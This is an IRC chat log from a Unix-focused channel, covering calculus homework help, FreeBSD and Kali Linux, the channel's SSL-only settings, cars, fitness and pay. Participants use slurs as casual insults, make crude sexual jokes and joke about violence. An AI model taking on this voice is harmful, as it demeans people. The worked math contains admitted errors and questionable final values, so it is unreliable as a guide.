20:41        dami0 │  A = 1/2 (pheta-t - sin pheta-t)r**2 & the equation for pheta-t
20:41       fenriz │  that's like an Unspoken Rule
20:41        dami0 │  tbuck: goes for rude as well
20:41       fenriz │  two questions:  is this multivariablle calculus?
20:41       fenriz │  also, is that a Sun Microsystemsl keyboard?
20:42         yrmt │  I'm back
20:42        dami0 │  no, yes
20:42         yrmt │  for more rice
20:42       fenriz │  let's see what yo uhave yrmt 
20:42         yrmt │  http://i.imgur.com/UlWw4A7.jpg?1
20:42         yrmt │  I'm pretty proud of this one
20:42        _pash │  dami0: alright thanks! ill try to read it! should be fine! thanks so much for the help
20:42        dami0 │  well, in the end, yes it will be multi-variable, but it can all be manipulated for one variable if you split it into parts
20:43       fenriz │  that's kinda cool, yrmt 
20:43       fenriz │  is there X?
20:43         yrmt │  no
20:43         yrmt │  netbsd console shot
20:43       fenriz │  i see.
20:43         yrmt │  hence the shitty pic
20:43         yrmt │  :p
20:43        dami0 │  _pash: no problem, also, the bit at the end is just area of hemisphere times the angle between sea level over pi
20:43         yrmt │  jmbi: linux framebuffer compat layer for netbsd incoming
20:43         yrmt │  prepare yo lube
20:44         yrmt │  because dis gon get fappy
20:44        _pash │  dami0: i will go take a break from maths now, and come back a bit later to tell you what ive understood, and will start programming soon
20:44        dami0 │  _pash: think terry's chocolate orange - it's a composition of those slices, except at infinitesimal sizes they can be approximated as areas
20:44         jmbi │  heh, so much for nofap
20:44       fenriz │  anyone seen phyrne lately?
20:44         yrmt │  yep
20:44       fenriz │  i have a couple of questions i remembered i need to ask him
20:44        dami0 │  fenriz: i was speaking to him earlier today\
20:44         yrmt │  he's been here a lot recently
20:44       fenriz │  hrm.
20:44       fenriz │  i guess just never here when i need him.
20:44       fenriz │  phyrne: yoooo
20:45        dami0 │  I'm going to take a smoke break as well. go muh nuclear astroblehbleh revision after ^.^
20:45        dami0 │  got*
20:45        _pash │  dami0: what do you study btw?
20:45        _pash │  uni?
20:45        dami0 │  yeah, 3rd year physics w/ nuclear astrophys 
20:46        _pash │  dami0: sounds awesome, im first year mech eng 
20:46       fenriz │  dami0: oh holy shit that sounds hard.
20:46        dami0 │  I think the only other hurdle you're going to encounter is I did the height from bottom to sea level, whereas the one you gave me is from side of cylinder to sea level perpendicular to wall
20:46       fenriz │  physics is really difficult for me.
20:46        dami0 │  fenriz: eh
20:47       fenriz │  i also learned that the smartest scientest in history are physicists :P
20:47        dami0 │  if you smoke enough weed it makes enough sense to be comprehendable
20:47       fenriz │  i like math n stuff, but once you bring in physics i go full retard.
20:47        dami0 │  fenriz: yeah, it's pretty much being a polymath at the higher levels
20:47        _pash │  dami0: yeah i just noticed that 
20:47       fenriz │  i like how all the famous scientists:  oppenheimer, fermi, einstein
20:47        _pash │  dami0: but im sure thats just cos/sin of that angle
20:47       fenriz │  are all physicists.
20:48       fenriz │  well, the big name ones at least.
20:48        dami0 │  statistics, computer science, straight up maths
20:48        dami0 │  that's like, a quarter of our studies.
20:48        dami0 │  _pash: yeah, should be able to transform from that the submerged lengths, think the first side has the maths on it
20:49       fenriz │  what will you work with after you graduate?
20:49        dami0 │  no idea
20:49        _pash │  dami0: alright, ill see you in a bit, if i dont get something again
20:49        _pash │  gonna take a break
20:50        dami0 │  cool
20:50        dami0 │  fenriz: I'm hoping for multi-million-dorrah computers connected to multi-million-wat lasers
20:50       fenriz │  hahaha
20:50       fenriz │  computers and physics.
20:51        _pash │  dami0: i am also realising something
20:51        dami0 │  yeah, there might be errors in the maths
20:51        _pash │  dami0: you did the case where the water level slices off straight through the cylinder
20:52        dami0 │  yeah, the case where it cuts the hemisphere is a rehash of the second page maths
20:52        _pash │  dami0: there are two other cases when the water level slices through one hemisphere or two hemi's at the same time. i am supposing that the calculation is going to change a lot, because 
20:52         rude │  yrmt, any idea if the official freebsd 10 release
20:53         rude │  is built with clang
20:53         rude │  they dont seem to state it anywhere
20:53        _pash │  ok let me understand everything you've done first and then ill come back to ya
20:53        _pash │  thanks again, see ya guys in a bit
20:53         yrmt │  rude: yeah it's built with clang
20:54         rude │  also not trying to be a troll, but it seems slower
20:55         rude │  than the equivalent 9.X
20:55         rude │  especially when compiling ports
20:55         rude │  i benchmarked it too
20:55         rude │  but i guess thats the cost of freedom
20:55        dami0 │  _pash: could well do equivalent of circle segment for spheres, then half it since hemi
20:55         jmbi │  rude: would you say freebsd is dying?
20:56        dami0 │  anywa, smoke break, brb

20:58         yrmt │  rude: yeah the kernel is still a bit slower
20:59         rude │  freebsd has evolved into gnu/linux, free edition
20:59         rude │  with pkgng, and the removal of the old pkg_* tools
20:59         rude │  was the final step, a pain-free package manager
20:59         rude │  like the ones found on major linux distros
21:00       shtols │  Now the only thing missing are consistently working packages.
21:00         jmbi │  yeah, a pain-free package manager for sure signifies that FreeBSD is going downhill

22:11         BigE │  it is Kali now
22:11        mafia │  so not only is this kid being a fucking idiot using BT, he's using an outdated BT.
22:11        mafia │  #secure
22:11         BigE │  a bunch of the devs left i think, so they rebranded it as Kali Linux
22:11         BigE │  and i think it is wholey owned by offensive security now
22:11         BigE │  or something like that
22:12        mafia │  yeah i know kali is the big thing now
22:12        mafia │  So i guess using kali is retarded, and BT is ultra retarded.
22:12        mafia │  I didn't think you could go below BT retarded

22:13        mafia │  im talking present

22:15         BigE │  yeah, i wish kali had some sort of light weight interface version
22:16         BigE │  cause i dont fucking need gnome if i am booting up kali
22:16        mafia │  how about no DE/WM
22:16         BigE │  they have that
22:16         BigE │  it is like 600MB
22:16        mafia │  then who gives a fuck about the gnome lmao
22:17         BigE │  but that doesnt work so hot if you want to, for example, do some aircrack

22:17         BigE │  where you need 3 open terms at a time

22:17         BigE │  oh
22:17         BigE │  yeah
22:17        mafia │  ;)
22:18         BigE │  something like an lmde would be great
22:20         BigE │  i think there are some other, more community distros out there
22:20         BigE │  some of them are also a bit more bleeding edge than kali
22:20         BigE │  and smaller

22:35       rudolf │  zygotb, could you be any more american?
22:35       zygotb │  My neighbor caught a hog in his trap this morning. I guess it was a bad day for the hog as well.
22:35       rudolf │  zygotb, you're a "mature" guy who has lived a bit
22:35       zygotb │  rudolf, I am what I am.
22:35        dami0 │  wish I could go hunting
22:35       rudolf │  why does everyone in america seem to like huge trucks
22:35       rudolf │  oversized pickups etc
22:36       rudolf │  everyone in europe does fine with a 3 door, 1.6L diesel hatchback
22:36       rudolf │  but in america, everything is oversized
22:36        dami0 │  rudolf: fuck you. 
22:36        dami0 │  it's 200bhp sports coupe or nothing
22:36       rudolf │  enjoy wasting your cash on fuel
22:36       rudolf │  everyone knows the 1.9 turbo diesel
22:36       zygotb │  We have a lot of 4 wheel drive only roads on this island, so big trucks are a mainstay of fishing and hunting enthusiasts.
22:36       rudolf │  is the *best* engine available
22:37        dami0 │  the only people who drive hatchbacks with 1.6 l diesels are people who can't afford insurance for anything bigger because they're mangs
22:37        dami0 │  rudolf: yeah, exactly. like a nice peugout 407
22:37       rudolf │  dami0, or people who arent retarded

22:40        dami0 │  bmw has some pretty cars.
22:40       zygotb │  I've always thought of Porsche as being a pretentious Volkswagon.
22:40       rudolf │  zygotb, well if you know the history of porsche
22:40       rudolf │  you might as well be buying a vw
22:40       zygotb │  LoL
22:40        dami0 │  audis from 10 years ago still run, but none of them actually run good, or are comfortable
22:40        dami0 │  rudolf: not trolling, just telling you the truth

22:41       rudolf │  with middle aged men

22:45       zygotb │  Yes. The rodents are driving the vehicle in a commercial.
22:45        dami0 │  are they meerkats?

22:46        dami0 │  I don't watch broadcast telivision or do anything fishy on the internet
22:46        dami0 │  so my exposure to ads is limited

22:27     NeoTerra │  that's never fun mang
22:27        dami0 │  yeah, especially that I looked at a question in the tutorial
22:27        dami0 │  afterwards and realised I screwed it up and it was the exact same in the exam
22:29        dami0 │  what's up with you?
22:31     NeoTerra │  not much, going out tonight but not for awhile, gonna work out and just relax
22:31        dami0 │  cool. I want to work out so badly after exams are over
22:31        dami0 │  do all the cool things.
22:31        dami0 │  how much you bench?
22:32     NeoTerra │  I can bench ~200
22:32     NeoTerra │  haven't in awhile though
22:32     NeoTerra │  benching doesn't do much for you
22:32        dami0 │  pounds or kilos?
22:33     NeoTerra │  I just do situps, crunches, plank, pushups, and hammer curls
22:33     NeoTerra │  pounds dami0
22:33     NeoTerra │  svante what kind of internship?
22:33        dami0 │  yeah, I usually only did it with like 30kgs total, but proper slow reps, 15x3
22:33     NeoTerra │  30kg for hammercurls?
22:33       svante │  job experience or something i dont know oracle has an office quite close to me i might apply for internship
22:35     NeoTerra │  like what kind of job, something technology related?
22:35        dami0 │  NeoTerra: 30 on chest press
22:35        dami0 │  it was like two years ago though
22:36       svante │  yeah we get to choose
22:36     NeoTerra │  dami0 ahh, yeah I do 50lbs per arm, but lately I've been doing them fast, need to stand against a wall and do them slowly
22:36     NeoTerra │  svante cool, how long is the internship
22:36        dami0 │  don't do it against wall
22:36        dami0 │  strengthen your stabiliser muscles
22:36       svante │  2 weeks
22:36        dami0 │  do it all with barbells 
22:37        dami0 │  svante: yeah, nice man.
22:37         join │  bottomy
22:38     NeoTerra │  dami0 I do use barbells, but I find if I do them just standing then I end up cheating by using momentum to lift
22:38        dami0 │  choice isn't something we get often
22:39     NeoTerra │  svante that's not too bad
22:39        dami0 │  NeoTerra: oh. that's why I did them slow but apparently I developed different types of muscle at this point
22:39       svante │  i'll probably fuck it up somehow
22:39      bottomy │  NeoTerra: you talking about for curls or what?
22:39     NeoTerra │  bottomy yeah, curls
22:39        dami0 │  svante: better an internship than a job
22:40      bottomy │  you can do them whilst sitting
22:40        dami0 │  bottomy: no, he talking about broads mane
22:40        dami0 │  he does them against the wall
22:40        dami0 │  :P
22:40      bottomy │  oh
22:40        dami0 │  jk
22:40     NeoTerra │  bottomy I find a wall is good
22:40     NeoTerra │  sitting is okay too
22:43     NeoTerra │  I find a wall is good because it helps with my posture
22:43     NeoTerra │  if you push yourself against the wall while lifting it makes my back straight
22:44         join │  exaem
22:44      bottomy │  only issue with a wall for curls is it prevents you from doing full range of motion since the plates hit the wall

22:49        exaem │  how does one order from anne summers without my parents reading the order on the box
22:50      bottomy │  don't know what that is, so maybe just order (parents won't know either?)
22:50     NeoTerra │  bottomy it's a lingerie store

22:52        dami0 │  exaem: oooh. I've recently saw this just-post box [or something else] where they delivered the parcel
22:52      bottomy │  even if you sent it as a gift (assuming they'd gift wrap) for her? doubt the dad would open it himself
22:52        dami0 │  and you can post from there too
22:52   OlaHughson │  oh, crossdressing~
22:52        dami0 │  bottomy: never be surprised at how much privacy parents are willing to take away to feel secure in their children's deicison
22:52   OlaHughson │  through I was never interested in lingeriue

22:53        exaem │  and we had to hide them
22:53      bottomy │  otherwise you might be able to tell your local postoffice whether they'd be able to hold onto/receive the package for you (or set up a PO box)

17:10        dami0 │  did join server, but I couldn't get ssl working 
17:10        dami0 │  anyway, do we need ssl for bot?
17:10     NeoTerra │  yeah
17:10     NeoTerra │  I can try an exempt it though
17:10        dami0 │  i thought an sajoin would work
17:11     NeoTerra │  thanks for the hug yrmt :)
17:11     NeoTerra │  dami0 I don't think that precludes it from channel modes
17:12        dami0 │  it does, i once got sajoin into a ircop channel
17:13     NeoTerra │  kk is the bot on the server?
17:13        dami0 │  anyway, you can try sajoining _ 
17:13     NeoTerra │  dami0 what is the nick of the bot
17:13        dami0 │  apparently user cat is on the server somewhere, but I have no idea how
17:13        dami0 │  so, nick got changed to _
17:14     NeoTerra │  this user maybe? c UH-CAABCF6C.iotek.org irc.unixhub.net cat G? :0 Unknown
17:14        dami0 │  ah, I think that's a znc node
17:15     NeoTerra │  yeah thought so too
17:15        dami0 │  thought maybe that would take care of ssl but no fish
17:15     NeoTerra │  ahh wait found it
17:15     NeoTerra │  dami0 You cannot SAJOIN _ to #unixhub because the channel is +z and the user is not connected via SSL
17:15     NeoTerra │  lol
17:16        dami0 │  oh interesting
17:16        dami0 │  so, it's just +z that it doesn't preclude
17:16     NeoTerra │  well see +z is an unreal thing, not a standard IRC thing, so yeah
17:16        dami0 │  welp, no bot for you
17:16     NeoTerra │  that's probably why
17:16     NeoTerra │  there are bots that use SSL, because freenode is ssl
17:16        dami0 │  yeah, but they're not *my* bots

17:22     NeoTerra │  dami0 yes I know it's not "NSA proof" but it's better than having everyone send their nickserv passwords over plaintext
17:22     NeoTerra │  lol
17:22        dami0 │  not really
17:22        dami0 │  considering they talk about software that is commercially available
17:23        dami0 │  anyway, if you have your irc password the same as on your other accounts, you should get hacked to learn about security XD
17:24     NeoTerra │  dami0 the thing is, what you posted there requires a proxy to intercept the connection between the server and your client
17:24     NeoTerra │  so unless your ISP is super malicious and does this, which I doubt, then yeah
17:24     NeoTerra │  but if you have the same password for everything, yeah you be stupid
17:25        dami0 │  well, the cable to my house is exposed, 
17:25        dami0 │  then again, if anyone wants those passwords badly enough they'll find a weak link somewhere
17:26     NeoTerra │  is this all because of your bot? :P

19:24  NeoTerra|AF │  or was that a test

19:24     ne0phyte │  if someones afk he can set a message and on "NAME:" the bot answers that hes gone

19:24  NeoTerra|AF │  lol
19:24        dami0 │  i dunno
19:25        dami0 │  he was on #archlinux at the time, so...
19:25        dami0 │  ne0phyte: that's exactly what /away message does
19:25  NeoTerra|AF │  well he's not on now so I can't really do anything about it -.-
19:25     ampharos │  so i listened to kapital with headphones on in bed, nice album, stragetic sampling use
19:26        dami0 │  you can send a temp password in a memo
19:26     ne0phyte │  :|
19:26        dami0 │  ne0phyte: and the message can be customised
19:26  NeoTerra|AF │  nah I'm not going to do that
19:26        dami0 │  ok. he says he's out so I'll just tell him to pm you
19:28  NeoTerra|AF │  also how do all these people forget their nickserv passwords
19:28  NeoTerra|AF │  you put it in your autoconfig and leave it there lul
19:28        dami0 │  drugs?
19:29  NeoTerra|AF │ sighs
19:30  NeoTerra|AF │  dami0 who's bot is that, yours? or dcat's
19:30        dami0 │  we both wrote parts of it
19:30  NeoTerra|AF │  who's system is it currently running off of?
19:30        dami0 │  iotek vps
19:31  NeoTerra|AF │  so if I sent those temporary nickserv passwords through the bot, that means they would be stored on that vps?
19:31        dami0 │  no, maybe they'd appear in the tmux session, but not logged
19:32        dami0 │  anyway, mxtm is on #archlinux, so if someone changed his password beforehand, we'd know about it.
19:32        dami0 │  I do know where you're coming from though
19:33  NeoTerra|AF │  I should write an official UnixHub bot
19:33  NeoTerra|AF │  for these sorts of things
19:33  NeoTerra|AF │  maybe when school is done I'll do it
19:34        dami0 │  well, do you need any more features from this one?
19:34        dami0 │  I was planning to clean it up after monday and we can just host it on the same server as the irc 
19:34  NeoTerra|AF │  Well I would want it in python, because I don't know golang
19:34        dami0 │  oh

02:07        crshd │  i'd like to know how many of the people who rave about OSS OSs *actually* sit down and read the source
02:07         jmbi │  crshd: probably like 12
02:07        dami0 │  I bet RMS does

02:08         BigE │  crshd: no one does
02:08     NeoTerra │  yeah he probably does
02:08         BigE │  however
02:09         BigE │  collectively, the source probably gets read quite often
02:09     ne0phyte │  yeah
02:09         BigE │  just spread across a lot of people
02:09     NeoTerra │  yeah I imagine people read individual parts
02:09     ne0phyte │  not everyone should have to read the source of all applications lol
02:09        dami0 │  >over 1 million locs

02:09     ne0phyte │  but as long as someone neutral does (e.g. the maintainer) it's still better than closed source
02:09         BigE │  well, i mean, the network stack devs would probably have a stroke trying to read the audio stack
02:09         BigE │  and vice versa
02:10     ne0phyte │  everyone would have a stroke reading alsa, oss, jack, pulse and so on
02:10        dami0 │  what if they're all trolling us, been bought out by NSA
02:10     ne0phyte │  if only there would be one major audio api 
02:10        dami0 │  and the other people simply don't know enough to know better?
02:10        crshd │  that would actually be hillarious
02:10        dami0 │  and microsoft wondoze is the safest OS?
02:11        dami0 │  I mean, that would be like, the most hilarious hijinx.

02:29         jmbi │  damn
02:29         jmbi │  i didn't know they were that far east lel
02:29        crshd │  we also got KFC and BK
02:29     NeoTerra │  Determine the value of a and b such that the following function is continuous: -4ax^2 (if x =< -1), sqrt(1 - (bx)^2) if (-1 < x < 1), or (ax-1)^2 x >= 1
02:29        crshd │  and a handful of wendys
02:29         jmbi │  niice
02:31        dami0 │  just hold the points at the limits and make them equal
02:31        dami0 │  -4ax^2 = sqrt(1-(bx)^2) for x = -1
02:32     NeoTerra │  and then solve for a and b using substitution?
02:32        dami0 │  no
02:32        dami0 │  well, in the end yeah
02:32        dami0 │  but first you just get proportion
02:33     NeoTerra │  proportion?
02:33        dami0 │  a = 5*b
02:33        dami0 │  or something more correct
02:34     NeoTerra │  well if you isolate a I got a = (1 + b)/-4
02:34     NeoTerra │  and b = -4a - 1
02:34     NeoTerra │  for x = -1
02:34     NeoTerra │  is that what you mean?
02:34         jmbi │  BigE: just finished Weeds man
02:35         BigE │  please shut up
02:35         BigE │  i dont need any spoilers
02:35        dami0 │  everyone dies
02:35         jmbi │  i won't spoil it, all i'll say is it's a good ending
02:35        dami0 │  turns out the mexican wasn't dead
02:35         BigE │  sounds good dami0 
02:36        dami0 │  i didn't watch it
02:36        dami0 │  i stpped around season 5
02:37     NeoTerra │  dami0 is what I had there on the right track?
02:37        dami0 │  i think so
02:37        dami0 │  set x at one and compare the other a expression
02:37        dami0 │  get values for them then just plug them in and see if they're equal 
02:38        dami0 │  I was taught that any time an equation changes it's discontinuous though
02:38     NeoTerra │  so like solve for b using substitution, and then do -4ax^2 = (ax-1)^2
02:38     NeoTerra │  ?
02:38        dami0 │  but it's all just convention and nomenclature. the actual maths doesn't change
02:38        dami0 │  yeah
02:38     NeoTerra │  kk thought so
02:38     NeoTerra │  thanks man
02:40        dami0 │  no problem
02:40         quit │  vypr
02:43     NeoTerra │  I keep getting b = b
02:43     NeoTerra │  or a = a
02:47        crshd │  weeds? i think i never watched the last episode
02:48        crshd │  that show gradually turned to shit after season 1
02:48         jmbi │  eh it wasn't too bad
02:48         jmbi │  up and down
02:48        dami0 │  i'll do it
02:48        crshd │  the last season was quite good again, but anything inbetween was mostly crap
02:49         join │  mafia
02:50         jmbi │  so then i shot him in the knee
02:50         jmbi │  and taped up his mouth
02:50         jmbi │  he's in the basement now
02:50         jmbi │  came on here to ask what i should do

02:57     NeoTerra │  ahh dami0
02:57        dami0 │  also, second minus should be +- in the last equation that isn't finished
02:57     NeoTerra │  you are truly a wonderful human being
02:57     NeoTerra │  I have been stuck on this question for awhile 
02:58        dami0 │  5 +- sqrt(24)
02:58        dami0 │  didn't even bother with a calculator. whatevs....
02:59        dami0 │  in surd form sqrt(24) = 2sqrt(6)
02:59        dami0 │  unless he wants it in decimal in which fuck him
02:59     NeoTerra │  nah they don't
02:59     NeoTerra │  lol
03:00        dami0 │  if only my stuff was this easy :<
03:00     NeoTerra │  I am not good at math like this
03:00        dami0 │  i'm doing freaking four dimensional vectors and 2nd order differential
03:00     NeoTerra │  that sounds...horrid
03:01        dami0 │  it could be worse
03:01        dami0 │  I could be doing psychology
03:03     NeoTerra │  lul
03:04        mafia │  :
03:05         jmbi │  l
03:07        mafia │  woops
03:09     NeoTerra │  dami0 so once I have b after using quadratic formula, I can use that solve for a, correct?
03:11        dami0 │  yeah
03:11        dami0 │  from the first equation
03:11        dami0 │  but the abc isn't the same in the determinant formula
03:11        dami0 │  it's from the quadratic i ended up with, which is in terms of a
03:12     NeoTerra │  right, so then I would go ahead and do -4ax^2 = (1 + 2sqrt(6)) / -4
03:13        dami0 │  the determinant formula gives you a, then you sub that into 16a^2 = 1 - b^2 to get b
03:13         quit │  mert|far_far_away
03:14     NeoTerra │  oh sorry yeah you're right, a = 2sqrt(6)
03:14     NeoTerra │  my bad
03:14        dami0 │  so b = sqrt(1 - 16a^2)
03:14     NeoTerra │  yeah
03:14        dami0 │  and they're continuous at x = -1 which I don't think makes a difference since squares
03:15        dami0 │  squares everywhere
03:15        dami0 │  (makes a difference as in, x could be 1 and it's the same
03:15        dami0 │  )
03:15     NeoTerra │  yeah I know that, they just need a and b
03:15     NeoTerra │  I hate these types of questions
03:15     NeoTerra │  continuity is gay
03:16        dami0 │  yeah, just ask marvel

03:20         join │  bottomy
03:21     NeoTerra │  yeah fan fiction is like that
03:21     NeoTerra │  also I think you made a small arithmetic mistake
03:21     NeoTerra │  16a^2 when square rooted is 4a, not 8a :P
03:25          yrmt│  yrmt|away
03:31        dami0 │  oh
03:31        dami0 │  yeah
03:34        dami0 │  3 +- 2sqrt(2) then, but you can just do this on your own, too tired for this
03:35     NeoTerra │  yeah I already did all that
03:35     NeoTerra │  lol
03:36     NeoTerra │  ended up getting a = 3sqrt(32) and b = 1 - 12sqrt(32)
03:37        dami0 │  ok
03:37     NeoTerra │  thanks again bruh

19:12         dcat │  also, this is of course entirely up to you ...

19:12        dami0 │  i did a /who before you did the enforce. jayro was the only one without r in the modes
19:13         dcat │  or any non-ssl listening sockets

19:13       rudolf │  dcat is right

19:13     NeoTerra │  dcat I considered it, but if users want to make other channels on the server, I would allow them the choice to make it SSL only or just normal
19:14        dami0 │  that makes no sense
19:14        dami0 │  unless they don't connect to #unixhub which pretty much no-one does
19:14     NeoTerra │  also if people connect now on 6667, and they try to join, then they get the no SSL error, but if I just stopped listening on 6667, they might assume the server was down and not come back

20:54     NeoTerra │  government workers are grossly overpaid IMO
20:54         BigE │  YES
20:54         BigE │  Okay
20:54        dami0 │  there was never a government were people were properly held accountable throughout the whole rule of it
20:54         BigE │  my dad knows these government couple
20:55         BigE │  they have both worked for 20 years
20:55         BigE │  they make like, 2 pay grades below the PM
20:55         BigE │  which is fine
20:55         BigE │  but once they retire
20:55         BigE │  after the full 20 years
20:55         BigE │  they both make 80% of their salary in pension until they die
20:55     NeoTerra │  BigE cashiers who work at the LCBO (liquor store) make $26/hr
20:55         BigE │  and when the other dies, they still get like 50% of their pension
20:56        dami0 │  what's full time, 10 hours a day, 5 days a wekk, 300 days a year?
20:56     NeoTerra │  oh yeah, my aunt is a school teacher and she banked all her sick days for 20 years and retired 2 years early on a fully paid salary
20:56        dami0 │  ok, more like 330 days a year
20:56     NeoTerra │  dami0 8 hours a day, 40 hours a week
20:56        dami0 │  224 thoushand a year at 10 hours * 330 days
20:56         BigE │  NeoTerra: and then teachers still bitch about their "low salary"\
20:57        dami0 │  ok, 54 thousand per person then,
20:57     NeoTerra │  the idea that people think they are entitled to a full salary for *not working* is beyond me
20:57        dami0 │  at that rate, working all year
20:57     NeoTerra │  just because they didn't get sick
20:58     NeoTerra │  wish I could get paid $75k/year for my perfect immune system too
20:58        dami0 │  considering how fucked they get from 
20:58        dami0 │  companies and everyone else around them, they can feel entitled to whatever they want
20:58     NeoTerra │  meh. what I meant about the middle class thing BigE was that the definition of who pays high taxes in this country is too low
20:58        dami0 │  75k/year? at 26 dorrah an hourer you get 54k
20:58     NeoTerra │  dami0 talking about school teachers
20:59        dami0 │  75k a year for not even full time work?
20:59        dami0 │  I mean, they don't even show up over the holidays
20:59     NeoTerra │  for example, a household income of over $150k pays 42% income tax
20:59     NeoTerra │  150k combined household in come is like 75k each
20:59        dami0 │  i guess they get high amount of hearing damage and working in american can get you stabbed for the worng thing
20:59        dami0 │  but still
20:59         quit │  mxda
20:59         quit │  rudolf
21:00     NeoTerra │  dami0 cashiers working at a liquor store don't get hearing damage
21:00     NeoTerra │  they sit on their ass and take people's money for booze
21:00        dami0 │  yeah, i know, I was talking about the teachers
21:00         quit │  vypr

21:00      NeoTerra│  NeoTerra|AFK
21:01        dami0 │  still. 75k/annum is not enough to get me to work as a teacher
21:01        dami0 │  i'd rather be a binman. get like what, >30k pounds a year
21:02         BigE │  is that 75k starting?
21:02        dami0 │  probably not
21:02         BigE │  yeah
21:02         BigE │  cause teachers here get like 40k starting
21:02         BigE │  but get like 55k if they have a masters
21:02         BigE │  and then they get raises over time
21:02         BigE │  and a fucking pensin
21:02         BigE │  pension
21:02        dami0 │  yeah, 20 thousand a year
21:03        dami0 │  for being a bin men
21:03         BigE │  that is shitty
21:03        dami0 │  starting, good ones get like 30-42
21:03        dami0 │  pounds
21:03         jmbi │  BigE: that's the same here
21:03        dami0 │  that's like 40 thousand a year starting salary
21:03        dami0 │  in dollars
21:04         jmbi │  most of my teachers get paid ~40k
21:04         BigE │  postmen here get like 25$ an hour
21:04        dami0 │  so, that's actually quite good considering you don't need high education
21:04         BigE │  postmen.
21:04         BigE │  like, dafuk
21:04         jmbi │  BigE: garbage collectors here get $30k
21:04        dami0 │  start early, put some money away, set for life
21:04         BigE │  not that i am complaining about it
21:04         jmbi │  my principal gets paid $110k
21:04         join │  venam
21:04         BigE │  i mean, people have the right to have their salary keep up with inflation
21:05         BigE │  but it is fucking retarded that all these brain dead government jobs pay so well
21:05        dami0 │  "A Binman once did a little poo in our next door neighbour's bin. Apparently they knew each other and were having a dispute."
21:05         jmbi │  i feel like teachers should get paid based on their test scores
21:05         BigE │  and you cant get a job as an engineer or anything like that for more than like 40k starting
21:05        dami0 │  exactly my point
21:05        dami0 │  getting a binman job you start earlier, 
21:05        dami0 │  and work less
21:06        dami0 │  meaning if you became a binman, then went to uni in the meantime, you could get a pretty cosy life
21:06         BigE │  yeah
21:06         BigE │  well
21:06        dami0 │  all the while having a salary at least 20 thousand pounds a yaer
21:06         jmbi │  me and shix will get phd's
21:06         jmbi │  and become janitors
21:06         BigE │  however
21:06         BigE │  and because i dont live on my own i cant test this
21:06        dami0 │  fuck. imagine all the pounds of weed
21:06         BigE │  but people are way more materialistic these days
21:06         BigE │  people have to buy fucking everything
21:06        dami0 │  well yeah, plebs look down on binmen
21:07         jmbi │  yes, because there is so much more to buy lel
21:07         BigE │  i know people that drink at bars 4 days a week and buy expensive clothes
21:07         BigE │  and while they have money for rent and food
21:07         BigE │  are always bitching about no spare money
21:07         BigE │  i dont buy much, and i hate drinking out
21:07         BigE │  so i imagine that if you are like me, you are going to have a better time as well
21:09        dami0 │  well, I frequently spend money on firvolities
21:09        dami0 │  frivolities*, but on the usual I sit tight and enjoy what I have
21:09        dami0 │  it's so much fun to clear random shit out of your room and make crazy ass contraptions with it
21:10         BigE │  i buy a computer every 2 years
21:10         BigE │  and maybe some clothes twice a year
21:10         BigE │  and that is about it
21:10         BigE │  besides alcohol
21:11        dami0 │  same, except more weed, and clothes in little bursts throughout the year
21:11        dami0 │  i really need start giving more of a shit about being normal, but it's just so difficult once you know so much

22:57        dami0 │  special scarf ^^

23:03       phyrne │  berk: It's erosion :) I believe crshd "ported" it from the vim colourscheme
23:03         berk │  phyrne: and how many pixels is your terminal inner margin?

23:13       phyrne │  berk: Set your bold font to be the same berk?
23:13         BigE │  god damn it, media server is so full that defragging wont fix the retardedly high read latency
23:13         berk │  done
23:14      lidstah │  yrmt: let's just hope he won't come back with a broken leg like 3 years ago :D

23:15         yrmt │  lidstah: tfw never broke anything in 15 years of skiing
23:15      lidstah │  yrmt: ;)
23:15       phyrne │  Hmm. Yeah, berk, have you set your bold font to be the same as your normal one? And when you reloaded your .Xdefaults, did you use '-merge' ? Try without it berk
23:15        dami0 │  six years here, haven't broken anything either
23:15         BigE │  that is because skiing lets you have control
23:15        crshd │  i never broke anything while skiing...
23:15         berk │  phyrne: Yeah I know how to merge :D
23:16         BigE │  snowboarding is basically one step away from tumbling down the hill
23:16         quit │  stealy
23:16        dami0 │  it does? I once nearly tore my ligaments by failing to see a little mound
23:16       phyrne │  berk: Yeah, I'm sure you do, I was saying to not use it ;)
23:16       phyrne │  :p
23:16         berk │  I -load
23:16        dami0 │  was putting my leg down but it got caught and I was going a little faster
23:16        crshd │  might be because i don't ski, tho
23:16       phyrne │  berk: Just `xrdb ~/.Xdefaults`
23:16         berk │  mhm 
23:16       phyrne │  Not sure it'd make much of a difference
23:16       phyrne │  :p
23:16       phyrne │  Doubt it
23:17      lidstah │  yrmt && dami0: that's why I don't ski or skateboard nowadays: broken my knees. Left one while skateboarding and thinking it would be nice to try this noseslide thinggy. Right one when snowboarding (dunno really why, just heard "crack", then pain. False movement maybe)
23:17        dami0 │  okay. weird
23:17        crshd │  now i did skate, but still didn't break anything
23:17      lidstah │  lucky guyz :)
23:17         yrmt │  lidstah: sucks :(
23:17        crshd │  for me it's all been rugby
23:18        dami0 │  I've fallen off of motorcycles, cruised on my ass for like half the damn slope after slipping on ice, launched a stone bigger than my head of a trebuchet and had it land less than 1 foot from my feet
23:18         berk │  phyrne: http://paste.unixhub.net/index.php/Itf8T1/
23:18        crshd │  collarbone, various fingers, toes, and my nose a couple of times
23:18         yrmt │  my gf fell earlier today and she has fragile knees :(
23:18         berk │  better now :D
23:18        crshd │  and some concussions :D
23:18       phyrne │  berk: Yay :)
23:18         berk │  I wish my screen was smaller
23:18        dami0 │  falled drunk of my ass off of horseback, nearly got caught in traffic a couple of times, paralysed my ass when longboarding
23:18         berk │  it would justify using small fonts
23:18        dami0 │  not once have I broken anything dude
23:18       phyrne │  heh :p
23:19      lidstah │  yrmt: well, at least I can appreciate a nice beer, or "vin chaud" while looking at the mountains when I go in mountain's holidays. I also love walking/hiking (or trekking? dunno which one is the  right word in english)
23:19       phyrne │  berk: I forget, what OS you running nowadays?
23:19         berk │  FreeBSD
23:19       phyrne │  lavly :)
23:19         yrmt │  lidstah: awesome !
23:19        dami0 │  but all this just fills me with the fear that when I do break, it will be catastrophic
23:19         yrmt │  phyrne: new bsdnow episode

23:21      lidstah │  20 bucks, mini sd adapter, 4GB micro-sd, french charger. Next step, going to my local electronics retailer to get the stuff to serial-mod it. Then, no more thinkpad in my backpack when I'm working :)
23:21       phyrne │  berk: She'll love it
23:21         berk │  I'll tell you how big it is

23:22       phyrne │  The result was my Apple login logo.... is now my boot logo :D
23:23       phyrne │  berk: cool story bro. Give her "the shocker"
23:23         berk │  And the distance from the tip of my middle finger and my wrist is 25 cm
23:23         vypr │  berk: use a blaster rake.

